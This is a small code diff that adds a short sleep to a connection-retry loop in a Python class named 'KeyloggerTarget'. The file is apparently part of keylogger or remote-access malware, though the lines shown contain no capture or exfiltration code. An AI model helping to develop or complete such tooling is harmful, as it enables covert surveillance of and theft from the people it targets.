@@ -52,6 +52,7 @@ class KeyloggerTarget:
                 self.true_connection = True
                 break
             except:
+                time.sleep(0.5)
                 continue
 
         try:
